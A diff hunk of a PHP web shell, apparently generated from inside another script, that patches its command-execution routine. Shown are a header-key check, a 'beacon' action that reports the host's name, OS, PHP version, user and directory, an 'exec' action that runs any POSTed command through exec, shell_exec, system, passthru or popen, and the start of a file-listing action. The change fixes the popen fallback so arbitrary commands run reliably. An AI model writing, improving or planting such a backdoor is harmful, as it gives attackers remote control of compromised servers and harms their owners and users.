@@ -53,8 +53,8 @@ header('Content-Type: application/json');
 if(!isset(\$_SERVER['HTTP_X_AUTH'])||\$_SERVER['HTTP_X_AUTH']!==\$k){http_response_code(403);exit;}
 if(\$a==='beacon'){echo \$j(['status'=>'ok','data'=>['hostname'=>gethostname(),'os'=>php_uname(),'php'=>phpversion(),'user'=>function_exists('get_current_user')?get_current_user():'N/A','cwd'=>getcwd()]]);exit;}
 if(\$a==='exec'){\$c=\$_POST['cmd']??'';\$o='';
-foreach(['exec','shell_exec','system','passthru','popen'] as\$f){
-if(function_exists(\$f)){\$f==='popen'?(\$h=popen(\$c,'r')&&while(!feof(\$h))\$o.=fread(\$h,4096)&&pclose(\$h)):(\$o=\$f(\$c));break;}}
+foreach(['exec','shell_exec','system','passthru'] as\$f){if(function_exists(\$f)){\$o=\$f(\$c);break;}}
+if(!\$o&&function_exists('popen')){\$h=popen(\$c,'r');while(!feof(\$h))\$o.=fread(\$h,4096);pclose(\$h);}
 echo \$j(['status'=>'ok','output'=>\$o,'cwd'=>getcwd()]);exit;}
 if(\$a==='file'){\$p=\$_POST['path']??getcwd();\$f=\$_POST['faction']??'list';
 if(\$f==='list'){\$i=array_diff(scandir(\$p),['.','..']);\$l=[];
